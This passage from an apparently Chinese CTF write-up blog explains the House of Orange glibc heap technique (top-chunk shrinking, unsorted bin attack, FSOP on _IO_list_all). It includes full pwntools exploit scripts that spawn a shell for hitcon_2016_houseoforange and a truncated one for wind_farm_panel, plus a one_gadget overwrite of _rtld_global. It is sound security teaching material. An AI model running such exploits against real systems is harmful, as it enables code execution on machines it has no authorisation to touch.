class="number">27518</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/ld-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./the_end&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset_ldbase_of_libcbase = <span class="number">0x3f1000</span><span class="comment">#0x5b7000</span></span><br><span class="line">offset_dl_rtld_lock_recursive_of_rtld_global = <span class="number">0xf00</span></span><br><span class="line">offset_dl_rtld_unlock_recursive_of_rtld_global = <span class="number">0xf08</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;gift &quot;</span>)</span><br><span class="line">sleep_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;sleep_addr:&quot;</span>+<span class="built_in">hex</span>(sleep_addr))</span><br><span class="line">libc_base = sleep_addr-libc.sym[<span class="string">&#x27;sleep&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ld_base = libc_base+offset_ldbase_of_libcbase</span><br><span class="line">log.info(<span class="string">&quot;ld_base:&quot;</span>+<span class="built_in">hex</span>(ld_base))</span><br><span class="line">rtld_global = ld_base+ld.sym[<span class="string">&#x27;_rtld_global&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;rtld_global:&quot;</span>+<span class="built_in">hex</span>(rtld_global))</span><br><span class="line">dl_rtld_lock_recursive = rtld_global+offset_dl_rtld_lock_recursive_of_rtld_global</span><br><span class="line">log.info(<span class="string">&quot;dl_rtld_lock_recursive:&quot;</span>+<span class="built_in">hex</span>(dl_rtld_lock_recursive))</span><br><span class="line">dl_rtld_unlock_recursive = rtld_global+offset_dl_rtld_unlock_recursive_of_rtld_global</span><br><span class="line">log.info(<span class="string">&quot;dl_rtld_unlock_recursive_of_rtld_global:&quot;</span>+<span class="built_in">hex</span>(dl_rtld_unlock_recursive))</span><br><span class="line"></span><br><span class="line">onegadget = libc_base+<span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x964)&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line"><span class="comment">#p.send(p64(dl_rtld_lock_recursive+i))</span></span><br><span class="line">p.send(p64(dl_rtld_unlock_recursive+i))</span><br><span class="line">p.send(p64(onegadget)[i])</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;exec 1&gt;&amp;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>house of orange 特殊之处是题目没有 free 函数等释放堆块函数。house of orange 核心思想通过漏洞实现 free 的效果。</p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>能控制 topchunk size 位（堆溢出等）</li><li>能控制堆分配的大小</li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当 topchunk 不能满足申请分配的大小时，topchunk 被释放进 unsortedbin ，实现没有 free 函数释放堆块。</p><p>扩展堆空间有 <code>mmap</code> 和 <code>brk</code> 两种方式，我们需要以 <code>brk</code> 拓展，需要绕过 libc 一些 check ：<strong>malloc 申请大小不能大于 <code>mmp_.mmap_threshold</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure><p>总结伪造 topchunk 要求：</p><ul><li><p>伪造 size 需要对齐内存页</p><p>比如现在 topchunk size 为：<code>0x20fa1</code>，那么对齐内存页的 size 可以为：0xfa1、0x1fa1……</p></li><li><p>size 要大于 MINSIZE</p></li><li><p>prev_inuse 为 1</p></li><li><p>size 要小于等等申请 chunk_size+MINISIZE （才能让 topchunk 放入 unsortedbin）</p></li></ul><p>自此得到一个 unsortedbin 堆，用来泄露 libc 地址，实现 FSOP</p><h3 id="hitcon-2016-houseoforange"><a href="#hitcon-2016-houseoforange" class="headerlink" title="hitcon_2016_houseoforange"></a>hitcon_2016_houseoforange</h3><h4 id="基本情况-2"><a href="#基本情况-2" class="headerlink" title="基本情况"></a>基本情况</h4><p>保护全开，实验环境在 Ubuntu16.04。</p><p>能自主控制分配堆大小，结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  *info;</span><br><span class="line">  chunk_ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span>&#123;</span></span><br><span class="line">  price;</span><br><span class="line">  color;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 edit 函数中存在堆溢出：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216230021.png" alt="image-20201216230021762"></p><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>利用堆溢出将 topchunk size 改小，size 要求看前文。修改前 topchunk 和 heap 范围：</p><p>![image-20201216231726321](../../../../../Library/Application Support/typora-user-images/image-20201216231726321.png)</p><p>修改后情况：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216231929.png" alt="image-20201216231929179"></p><p>之后申请一个大于 topchunk 的堆，topchunk 就被放入 unsortedbin ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555557580a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557580a0</span><br></pre></td></tr></table></figure><p>申请一个 largebin 用于泄露 libc 和 堆地址。用的 malloc 分配，libc 读取 bk 位置信息即可，分配的是 largebin 在 fd_nextsize 和 bk_nextsize 都存放堆地址分别读出即可。堆地址在 FSOP 伪造 vtable 需要用到。</p><p>自此后面就是 FSOP 利用。劫持在 libc 中的 _IO_list_all 内容，将其内容指向可控地址伪造 _IO_FILE_plus 和 vtabel 。默认状态下的 _IO_list_all 指向的是 _IO_2_1_stderr_ ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216232611.png" alt="image-20201216232610931"></p><p>利用堆溢出修改在 unsortedbin 的 topchunk fd bk 指针，发起 unsortedbin attack 劫持 _IO_list_all 。这里修改完 fd bk 之后申请一个堆，topchunk unlink 就会修改 _IO_list_all 指向到 main_arena+88 ，这个区域前后我们还是不能控制，就利用 _chain 标志位指向下一个文件流，这个标志位的位置刚好是 unsortedbin 0x60 链表位置。因此将 topchunk size 覆盖为 0x60 ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216234838.png" alt="image-20201216234838174"></p><p>执行 _IO_flush_all_lockp 时逐个遍历文件流，遇到错误文件就跳过去处理 _chain 指向的下一个文件流，因此现在 topchunk 里面伪造一个 _IO_FILE_plus 结构体。</p><p>需要设置几个标志位绕过保护：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mode_offset=<span class="number">0x0</span>;</span><br><span class="line">writeptr_offset=<span class="number">0x1</span>;</span><br><span class="line">writebase_offset=<span class="number">0x0</span>;</span><br></pre></td></tr></table></figure><p>然后将 vtable 指针劫持会 topchunk 特定位置，让 __overflow 为 system ，文件流（topchunk）头部覆盖为 /bin/sh 作为参数传入。</p><p>成功结构体如下：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201217000607.png" alt="image-20201217000607071"></p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201217000644.png" alt="image-20201217000644542"></p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./houseoforange_hitcon_2016&quot;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29595</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./houseoforange_hitcon_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content, price, color</span>):</span></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">command(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">size, content, price, color</span>):</span></span><br><span class="line">command(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 &#x27;free&#x27; 2 bin</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line"><span class="comment">#0x555555758000     0x555555779000 rw-p    21000 0      [heap]</span></span><br><span class="line"><span class="comment">#0x555555758000     0x55555579b000 rw-p    43000 0      [heap]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 leak libc</span></span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_addr = leak_addr-<span class="number">1640</span>-<span class="number">0x3c4b20</span></span><br><span class="line">log.info(<span class="string">&quot;libc_addr:&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">IO_list_all=libc_addr+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;IO_list_all:&quot;</span>+<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">system=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 leak heap</span></span><br><span class="line">payload = <span class="string">&#x27;d&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0x10</span>, payload,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;heap_addr:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set fake struct</span></span><br><span class="line">payload=<span class="string">&#x27;d&#x27;</span>*<span class="number">0x450</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000ddaa00000003</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake = fake.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake += p64(heap_addr+<span class="number">0x558</span>) <span class="comment">#vtable</span></span><br><span class="line">fake += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake += p64(system)</span><br><span class="line">payload += fake</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink attack</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><ul><li><a href="https://www.cnblogs.com/shangye/p/6268981.html">ctf-HITCON-2016-houseoforange学习</a></li><li><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036">houseoforange_hitcon_2016（House of orange， unsorted bin attack，FSOP）</a></li><li><a href="https://www.jianshu.com/p/1e45b785efc1">house_of_orange</a></li></ul><h3 id="2020-纵横杯-wind-farm-panel"><a href="#2020-纵横杯-wind-farm-panel" class="headerlink" title="2020_纵横杯_wind_farm_panel"></a>2020_纵横杯_wind_farm_panel</h3><h4 id="基本情况-3"><a href="#基本情况-3" class="headerlink" title="基本情况"></a>基本情况</h4><p>十分明显的堆溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">edit</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please modify your personal information.\nWhich turbine: &quot;</span>);</span><br><span class="line">  v3 = read_int(<span class="string">&quot;Please modify your personal information.\nWhich turbine: &quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( !*((_QWORD *)&amp;area + v3) || v3 &lt; <span class="number">0</span> || v3 &gt; <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Unvalidated Input&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;area + v3), <span class="number">0x1000</span>uLL);   <span class="comment">// 堆溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><p>满足 <code>house_of_orange</code> 的条件：堆溢出能修改 topchunk size ；申请 size 限制范围大；没有 free 功能。</p><ol><li>溢出修改 topchunk size ，申请大于 topchunk 的堆，将 topchunk 放入 unsortedbin ，然后泄露 libc 地址</li><li>修复 chunk_size&amp;pre_size ，申请 larginbin 泄露 heap_addr</li><li>FSOP</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># overwrite topchunk size</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0xf71</span>))</span><br><span class="line"><span class="comment"># frow topchunk into unsortedbin</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xfff</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">88</span>-<span class="number">0x3c4b20</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>申请 larginbin 之前，需要修复泄露 libc 破坏的 chunk_szie ，以后布置 prev_size ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># repair chunk_size&amp;prev_size</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0xf71</span>)+p64(libc_base+<span class="number">88</span>+<span class="number">0x3c4b20</span>)*<span class="number">2</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0xf50</span>+p64(<span class="number">0xf70</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># larginbin leak heap addr</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x450</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xa0</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x90</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure><h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;182.92.203.154&quot;,28452)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">command(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">command(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite topchunk size</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0xf71</span>))</span><br><span class="line"><span class="comment"># frow topchunk into unsortedbin</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xfff</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span 